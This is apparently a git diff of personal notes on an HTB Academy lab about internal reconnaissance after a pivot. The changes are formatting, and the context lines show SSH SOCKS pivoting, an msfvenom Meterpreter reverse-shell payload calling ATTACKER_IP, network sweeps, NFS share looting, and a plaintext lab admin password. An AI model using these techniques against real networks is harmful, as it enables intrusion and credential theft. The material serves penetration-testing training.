@@ -1,4 +1,4 @@
-# Internal Information Gathering
+# 🔍 Internal Information Gathering
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 🔄 Pivoting Setup Methods
 
 ### 🔑 SSH Dynamic Port Forwarding
+
 ```bash
 # Establish SSH SOCKS proxy
 ssh -D 8081 -i dmz01_key root@TARGET_IP
@@ -23,6 +24,7 @@ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
 ```
 
 ### 🎯 Metasploit Autoroute Alternative
+
 ```bash
 # 1. Generate Meterpreter payload
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf > shell.elf
@@ -50,6 +52,7 @@ run
 ## 🔍 Internal Host Discovery
 
 ### 📊 Network Scanning Approaches
+
 ```bash
 # Method 1: Bash ping sweep (from pivot host)
 for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
@@ -70,6 +73,7 @@ proxychains nmap -sn 172.16.8.0/23
 ```
 
 ### 🎯 Discovered Infrastructure
+
 ```cmd
 # Network topology mapping:
 172.16.8.3   - Domain Controller (DNS, Kerberos, LDAP, SMB)
@@ -86,6 +90,7 @@ Low: Domain Controller (172.16.8.3) - hardened target
 ## 🔍 Service Enumeration Results
 
 ### 📊 172.16.8.3 - Domain Controller Analysis
+
 ```bash
 # Port enumeration:
 53/tcp   open  domain      # DNS
@@ -106,6 +111,7 @@ proxychains enum4linux -U -P 172.16.8.3
 ```
 
 ### 🖥️ 172.16.8.50 - Tomcat Server Analysis
+
 ```bash
 # Port enumeration:
 135/tcp  open  epmap       # RPC endpoint mapper
@@ -123,6 +129,7 @@ run
 ```
 
 ### 🌐 172.16.8.20 - Windows Server + NFS
+
 ```bash
 # Port enumeration:
 80/tcp   open  http        # DotNetNuke (DNN)
@@ -141,6 +148,7 @@ proxychains showmount -e 172.16.8.20
 ## 📁 NFS Share Exploitation
 
 ### 🔍 NFS Misconfiguration Assessment
+
 ```bash
 # NFS export enumeration
 showmount -e 172.16.8.20
@@ -160,6 +168,7 @@ WatchersNET.CKEditor.sln
 ```
 
 ### 🔐 Credential Discovery in Config Files
+
 ```bash
 # DNN configuration analysis
 cd /tmp/DEV01/DNN/
@@ -183,6 +192,7 @@ cat web.config
 ## 🌐 DotNetNuke (DNN) Analysis
 
 ### 📊 Application Assessment
+
 ```bash
 # DNN installation discovery
 proxychains curl http://172.16.8.20
@@ -201,6 +211,7 @@ Administrator:D0tn31Nuk3R0ck$$@123
 ```
 
 ### 🔍 Firefox SOCKS Proxy Configuration
+
 ```cmd
 # Firefox proxy setup:
 1. Settings → General → Network Settings
@@ -218,6 +229,7 @@ http://172.16.8.20/Login → Admin authentication portal
 ## 📡 Network Traffic Analysis
 
 ### 🔍 Packet Capture Setup
+
 ```bash
 # Traffic monitoring from pivot host
 tcpdump -i ens192 -s 65535 -w ilfreight_pcap
@@ -236,6 +248,7 @@ tcpdump -i ens192 -s 65535 -w ilfreight_pcap
 ```
 
 ### 📊 Network Intelligence Gathering
+
 ```bash
 # Routing table analysis
 ip route
@@ -252,6 +265,7 @@ netstat -antup
 ## 🎯 Attack Surface Assessment
 
 ### 🔴 High-Priority Targets
+
 ```cmd
 # 172.16.8.20 (DEV01):
 - DNN installation (potential admin access)
@@ -273,6 +287,7 @@ netstat -antup
 ```
 
 ### 🟡 Secondary Targets
+
 ```cmd
 # Additional reconnaissance opportunities:
 - Full TCP port scans on discovered hosts
@@ -285,6 +300,7 @@ netstat -antup
 ## 🛠️ Tools & Techniques Summary
 
 ### 🔄 Pivoting Methods
+
 ```bash
 # SSH dynamic port forwarding:
 ssh -D PORT -i private_key user@target
@@ -297,6 +313,7 @@ proxychains [command] → tunnel through established SOCKS proxy
 ```
 
 ### 🔍 Discovery Techniques
+
 ```bash
 # Host discovery:
 - Bash ping sweep (fast, efficient)
@@ -317,6 +334,7 @@ proxychains [command] → tunnel through established SOCKS proxy
 ## 🎯 HTB Academy Lab
 
 ### 📋 Lab Solution Summary
+
 ```cmd
 # Internal reconnaissance chain:
 1. SSH pivot setup → Dynamic port forwarding (8081)
@@ -335,6 +353,7 @@ proxychains [command] → tunnel through established SOCKS proxy
 ```
 
 ### 🔍 Learning Objectives
+
 ```cmd
 # Technical skills:
 - SSH dynamic port forwarding setup
@@ -358,6 +377,7 @@ proxychains [command] → tunnel through established SOCKS proxy
 ## 🛡️ Defensive Recommendations
 
 ### 🔒 Network Security
+
 ```cmd
 # Network segmentation:
 - Implement proper DMZ isolation
@@ -376,4 +396,4 @@ proxychains [command] → tunnel through established SOCKS proxy
 - Unusual connection monitoring
 - Privilege escalation detection
 - File access auditing
-``` 
+```
